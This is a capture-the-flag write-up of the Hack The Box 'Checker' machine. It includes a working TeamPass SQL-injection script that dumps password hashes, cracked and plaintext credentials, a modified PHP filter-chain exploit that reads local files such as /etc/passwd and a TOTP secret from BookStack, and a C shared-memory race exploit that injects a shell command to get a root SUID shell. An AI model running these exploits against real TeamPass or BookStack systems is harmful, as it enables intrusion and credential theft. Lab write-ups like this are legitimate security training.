# User flag
## 1. rustscan
```bash
# Nmap 7.94SVN scan initiated Wed Feb 26 21:57:19 2025 as: /usr/lib/nmap/nmap --privileged -vvv -p 22,80,8080 -sC -sV -oN checker 10.129.148.41
Nmap scan report for 10.129.148.41
Host is up, received echo-reply ttl 63 (0.25s latency).
Scanned at 2025-02-26 21:57:26 EST for 15s

PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 aa:54:07:41:98:b8:11:b0:78:45:f1:ca:8c:5a:94:2e (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNQsMcD52VU4FwV2qhq65YVV9Flp7+IUAUrkugU+IiOs5ph+Rrqa4aofeBosUCIziVzTUB/vNQwODCRSTNBvdXQ=
|   256 8f:2b:f3:22:1e:74:3b:ee:8b:40:17:6c:6c:b1:93:9c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIRBr02nNGqdVIlkXK+vsFIdhcYJoWEVqAIvGCGz+nHY

80/tcp   open  http    syn-ack ttl 63 Apache httpd
|_http-title: 403 Forbidden
|_http-server-header: Apache

8080/tcp open  http    syn-ack ttl 63 Apache httpd
|_http-server-header: Apache
|_http-title: 403 Forbidden
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## 2. Found Teampass on port 8080

Find this POC => https://security.snyk.io/vuln/SNYK-PHP-NILSTEAMPASSNETTEAMPASS-3367612
```bash
┌──(kali㉿kali)-[~/Desktop/htb]
└─$ cat poc.sh    
#!/bin/bash
if [ "$#" -lt 1 ]; then
  echo "Usage: $0 <base-url>"
  exit 1
fi

vulnerable_url="$1/api/index.php/authorize"

check=$(curl --silent "$vulnerable_url")
if echo "$check" | grep -q "API usage is not allowed"; then
  echo "API feature is not enabled :-("
  exit 1
fi

# htpasswd -bnBC 10 "" h4ck3d | tr -d ':\n'
arbitrary_hash='$2y$10$u5S27wYJCVbaPTRiHRsx7.iImx/WxRA8/tKvWdaWQ/iDuKlIkMbhq'

exec_sql() {
  inject="none' UNION SELECT id, '$arbitrary_hash', ($1), private_key, personal_folder, fonction_id, groupes_visibles, groupes_interdits, 'foo' FROM teampass_users WHERE login='admin"
  data="{\"login\":\""$inject\"",\"password\":\"h4ck3d\", \"apikey\": \"foo\"}"
  token=$(curl --silent --header "Content-Type: application/json" -X POST --data "$data" "$vulnerable_url" | jq -r '.token')
  echo $(echo $token| cut -d"." -f2 | base64 -d 2>/dev/null | jq -r '.public_key')
}

users=$(exec_sql "SELECT COUNT(*) FROM teampass_users WHERE pw != ''")

echo "There are $users users in the system:"

for i in `seq 0 $(($users-1))`; do
  username=$(exec_sql "SELECT login FROM teampass_users WHERE pw != '' ORDER BY login ASC LIMIT $i,1")
  password=$(exec_sql "SELECT pw FROM teampass_users WHERE pw != '' ORDER BY login ASC LIMIT $i,1")
  echo "$username: $password"
done

┌──(kali㉿kali)-[~/Desktop/htb]
└─$ bash poc.sh http://10.129.148.41:8080/
There are 2 users in the system:
admin: $2y$10$lKCae0EIUNj6f96ZnLqnC.LbWqrBQCT1LuHEFht6PmE4yH75rpWya
bob: $2y$10$yMypIj1keU.VAqBI692f..XXn0vfyBL7C1EhOs35G59NxmtpJ/tiy


┌──(kali㉿kali)-[~/Desktop/htb]
└─$ hashcat -a 0 -m 3200 hash.txt /usr/share/wordlists/rockyou.txt --username
$2y$10$yMypIj1keU.VAqBI692f..XXn0vfyBL7C1EhOs35G59NxmtpJ/tiy:cheerleader


# in teampass
ssh-access:hiccup-publicly-genesis

boosktack login: 
bob@checker.htb
mYSeCr3T_w1kI_P4sSw0rD
```

## 3. Found bookstack on port 80

=> maybe useful https://medium.com/stolabs/bookstack-cve-2020-5256-rce-through-file-upload-870a98228c7a
=> get passwd from teampass
=> find this https://fluidattacks.com/blog/lfr-via-blind-ssrf-book-stack/ and https://fluidattacks.com/advisories/imagination/
=> modify the script and LFR

exploit:
https://github.com/synacktiv/php_filter_chains_oracle_exploit
```bash

#==== modify php_filter_chains_oracle_exploit/filters_chain_oracle/core/requestor.py =====

def req_with_response(self, s):
        if self.delay > 0:
            time.sleep(self.delay)

        filter_chain = f'php://filter/{s}{self.in_chain}/resource={self.file_to_leak}'
        # DEBUG print(filter_chain)
        
        fc_bytes = filter_chain.encode("ascii")

        base64_bytes = base64.b64encode(fc_bytes)
        base64_string = base64_bytes.decode("ascii")

        #print(f"Encoded string: {base64_string}")
       
        img_chain = "html=<img+src='data:image/png;base64,"
        img_chain += base64_string
        img_chain += "'/>"

        # merged_data = self.parse_parameter(img_chain)
        
        merged_data = img_chain

# exploit 
┌──(kali㉿kali)-[~/Desktop/htb/php_filter_chains_oracle_exploit]
└─$ python3 filters_chain_oracle_exploit.py --target 'http://checker.htb/ajax/page/8/save-draft' --file '/etc/passwd' --verb PUT --parameter html --headers '{"Content-Type":"application/x-www-form-urlencoded", "Cookie":"XSRF-TOKEN=eyJpdiI6Ikk2eWpKNE9qMjFXUHRidFFaWWUvS0E9PSIsInZhbHVlIjoiUFZaVHU1eWIvTW8wdU5LQ01qZzhVcUltb090N0d5aC9heU9maks2cUdQRW53Q2RzVmF3UVkzZGVXVTBrZXhmRCtlQWxmVnArRVhRaE5aYjhCQWRpZjIxMzJXVXRJNXhWdG5JTGVwNmtESzNXYXIwWFRNb1FtU2tCZjM2UDE3NGwiLCJtYWMiOiJmMzBjNmYzZjllYzkyYWQ4ODhlNmYyMWNlNzdhMTAxM2IzZDEwZTFhNGNiMjZiYzM3MGY3MWEwMWY1MWZlNDk5IiwidGFnIjoiIn0%3D; bookstack_session=eyJpdiI6ImhUc1p0RzdzVTRuZEo4c3JHUzJiR1E9PSIsInZhbHVlIjoiSjdpZHZkbTB4b2RmQXprbk9CZ2RFZS9RUGZOOC9VMnh4UHowOW03UVNsS1pHQ3VtcHlTNkNYVmJIcWEwaXVSU3BHa1l3S0xSWTNQcTZGVC9kTFoxK2FnRzU0cWpzQm5TbU8zcmF4VmhiU0RVWk1EZUhFOGpxZ3JpVEU1aTlHN00iLCJtYWMiOiIxNWY2YmVmZmU0NzlkMGIxNWY5ZjUzNWE3M2JlM2ZjYzZiOGI3ZDdiNmZiNmI0MjNmY2E5YjQzNTg3YTI4OTFiIiwidGFnIjoiIn0%3D; remember_standard_59ba36addc2b2f9401580f014c7f58ea4e30989d=eyJpdiI6InBRQi80aHZsMkF1QUFLRW9POHJVZ3c9PSIsInZhbHVlIjoiM3lZQTNObU95SDlHRGNVMi9NUWhqYWg0TVdoMnRyVGhsVCtDSUpmL1pjdGltUmpnSmhpd3phOXdsZnBzc3NvN2VhZ3FGWWF1c0lyUlBGY2tzSk5QK3drNjQ3eVlNQy80amhxVzNtUVRLWGlIMU9aVDk0K3U4VkpkMm9ZTlBSQ0Y2TUhkd0ZOTVE2Y1BTalkxTHRLRnkybkZEdmw5bWoyckRhdlppdzI5cU53eGZHQVFqU2dSWk51V1NteGF0MnUrYndXVVFicGpOQ2tMc3luZDByZTYvL3Y1MGQzSzR4enNIZHRNUDhCd3Z1RT0iLCJtYWMiOiI0OTVkYjRiNTk4Y2Q3ZjY3MTAwNGFjNzkyZWFjZGU2NzQ5NmJlNTUyOTExYzNmMzNhYjRlYTYyN2M1M2RhYjBjIiwidGFnIjoiIn0%3D", "X-CSRF-TOKEN":"kpj3PdOH3eghhZLEXoVFjTvnyLyFwabckMABa0IY"}' --proxy http://127.0.0.1:8080
[*] The following URL is targeted : http://checker.htb/ajax/page/8/save-draft
[*] The following local file is leaked : /etc/passwd
[*] Running PUT requests
[*] Additionnal headers used : {"Content-Type":"application/x-www-form-urlencoded", "Cookie":"XSRF-TOKEN=eyJpdiI6Ikk2eWpKNE9qMjFXUHRidFFaWWUvS0E9PSIsInZhbHVlIjoiUFZaVHU1eWIvTW8wdU5LQ01qZzhVcUltb090N0d5aC9heU9maks2cUdQRW53Q2RzVmF3UVkzZGVXVTBrZXhmRCtlQWxmVnArRVhRaE5aYjhCQWRpZjIxMzJXVXRJNXhWdG5JTGVwNmtESzNXYXIwWFRNb1FtU2tCZjM2UDE3NGwiLCJtYWMiOiJmMzBjNmYzZjllYzkyYWQ4ODhlNmYyMWNlNzdhMTAxM2IzZDEwZTFhNGNiMjZiYzM3MGY3MWEwMWY1MWZlNDk5IiwidGFnIjoiIn0%3D; bookstack_session=eyJpdiI6ImhUc1p0RzdzVTRuZEo4c3JHUzJiR1E9PSIsInZhbHVlIjoiSjdpZHZkbTB4b2RmQXprbk9CZ2RFZS9RUGZOOC9VMnh4UHowOW03UVNsS1pHQ3VtcHlTNkNYVmJIcWEwaXVSU3BHa1l3S0xSWTNQcTZGVC9kTFoxK2FnRzU0cWpzQm5TbU8zcmF4VmhiU0RVWk1EZUhFOGpxZ3JpVEU1aTlHN00iLCJtYWMiOiIxNWY2YmVmZmU0NzlkMGIxNWY5ZjUzNWE3M2JlM2ZjYzZiOGI3ZDdiNmZiNmI0MjNmY2E5YjQzNTg3YTI4OTFiIiwidGFnIjoiIn0%3D; remember_standard_59ba36addc2b2f9401580f014c7f58ea4e30989d=eyJpdiI6InBRQi80aHZsMkF1QUFLRW9POHJVZ3c9PSIsInZhbHVlIjoiM3lZQTNObU95SDlHRGNVMi9NUWhqYWg0TVdoMnRyVGhsVCtDSUpmL1pjdGltUmpnSmhpd3phOXdsZnBzc3NvN2VhZ3FGWWF1c0lyUlBGY2tzSk5QK3drNjQ3eVlNQy80amhxVzNtUVRLWGlIMU9aVDk0K3U4VkpkMm9ZTlBSQ0Y2TUhkd0ZOTVE2Y1BTalkxTHRLRnkybkZEdmw5bWoyckRhdlppdzI5cU53eGZHQVFqU2dSWk51V1NteGF0MnUrYndXVVFicGpOQ2tMc3luZDByZTYvL3Y1MGQzSzR4enNIZHRNUDhCd3Z1RT0iLCJtYWMiOiI0OTVkYjRiNTk4Y2Q3ZjY3MTAwNGFjNzkyZWFjZGU2NzQ5NmJlNTUyOTExYzNmMzNhYjRlYTYyN2M1M2RhYjBjIiwidGFnIjoiIn0%3D", "X-CSRF-TOKEN":"kpj3PdOH3eghhZLEXoVFjTvnyLyFwabckMABa0IY"}
cm9vdDp4OjA6MDpyb290Oi9
b'root:x:0:0:root:/ <SNIP>'

# we found a script in bookstack takling about back, check out backup
read the file: /backup/home_backup/home/reader/.google_authenticator
b'DVDBRAODLCWF7I2ONA4K5LQLUE\n" TOTP_AUTH\n'

 
┌──(kali㉿kali)-[~]
└─$ qr "otpauth://totp/reader?secret=DVDBRAODLCWF7I2ONA4K5LQLUE" 

1. get qrcode and gen totp to login
2. get user flag

reader@checker:~$ ls
user.txt
```

# root flag
## 1. sudo -l
```bash
reader@checker:~$ sudo -l
Matching Defaults entries for reader on checker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User reader may run the following commands on checker:
    (ALL) NOPASSWD: /opt/hash-checker/check-leak.sh *
```

POC: 
```c
#include <stdio.h>
#include <stdlib.h>
#include <sys/ipc.h>
#include <sys/shm.h>
#include <time.h>
#include <errno.h>
#include <string.h>
#include <unistd.h>

#define SHARED_MEM_SIZE 0x400    // 1024 bytes
#define SHARED_MEM_PERMS 0x3B6   // Permissions: 0666 in octal
#define KEY_MAX_VALUE 0xfffff    // Maximum key value

static void remove_shared_memory(int shared_mem_id) {
    if (shmctl(shared_mem_id, IPC_RMID, NULL) == -1) {
        fprintf(stderr, "Failed to remove shared memory (ID: %d): %s\n", 
                shared_mem_id, strerror(errno));
    }
}

int main(void) {
    int shared_mem_id;
    char *shared_mem_ptr;
    
	# /////////////  put your cmd here ////////////////
    const char *message_payload = "Leaked hash detected at Sat Feb 22 23:21:48 2025 > '; chown root /tmp/rootbash;#";
    
    // Use current time for random seed
    srand((unsigned int)time(NULL));
    key_t memory_key = rand() % KEY_MAX_VALUE;
    printf("[+] Generated shared memory key: 0x%X\n", memory_key);

    // Create shared memory
    shared_mem_id = shmget(memory_key, SHARED_MEM_SIZE, IPC_CREAT | SHARED_MEM_PERMS);
    if (shared_mem_id == -1) {
        fprintf(stderr, "Failed to create shared memory segment: %s\n"
                "Key: 0x%X, Size: %d bytes, Permissions: 0%o\n",
                strerror(errno), memory_key, SHARED_MEM_SIZE, SHARED_MEM_PERMS);
        return EXIT_FAILURE;
    }
    printf("[+] Successfully created shared memory segment (ID: %d)\n", shared_mem_id);

    // Attach to shared memory
    shared_mem_ptr = shmat(shared_mem_id, NULL, 0);
    if (shared_mem_ptr == (char *)-1) {
        fprintf(stderr, "Failed to attach to shared memory segment (ID: %d): %s\n",
                shared_mem_id, strerror(errno));
        remove_shared_memory(shared_mem_id);
        return EXIT_FAILURE;
    }
    printf("[+] Successfully attached to shared memory segment\n");

    // Write payload to shared memory with bounds checking
    int written_bytes = snprintf(shared_mem_ptr, SHARED_MEM_SIZE, "%s", message_payload);
    if (written_bytes >= SHARED_MEM_SIZE) {
        fprintf(stderr, "Warning: Payload truncated! Required %d bytes, but only %d available\n",
                written_bytes, SHARED_MEM_SIZE);
    }
    printf("[+] Written %d bytes to shared memory\n", written_bytes);
    printf("[+] Shared Memory Content:\n%s\n", shared_mem_ptr);

    // Cleanup
    if (shmdt(shared_mem_ptr) == -1) {
        fprintf(stderr, "Failed to detach from shared memory segment (ID: %d): %s\n",
                shared_mem_id, strerror(errno));
        remove_shared_memory(shared_mem_id);
        return EXIT_FAILURE;
    }
    printf("[+] Successfully detached from shared memory segment\n");

    remove_shared_memory(shared_mem_id);
    printf("[+] Cleanup completed\n");
    
    return EXIT_SUCCESS;
}


1. gcc -o poc poc.c 
2. chmod +x ./poc 
3. cp /bin/bash /tmp/rootbash 
4. chmod +s /tmp/rootbash # 開兩個視窗，個別執行以下兩個指令 
5. while true; do ./poc ; done 
6. while true; do sudo /opt/hash-checker/check-leak.sh bob ; done 

 # 等待幾秒後，執行以下指令
6. ls -al /tmp/rootbash 
7. /tmp/rootbash -p



reader@checker:/tmp$ ./rootbash -p
rootbash-5.1# id
uid=1000(reader) gid=1000(reader) euid=0(root) groups=1000(reader)
rootbash-5.1# cat /root/root.txt
```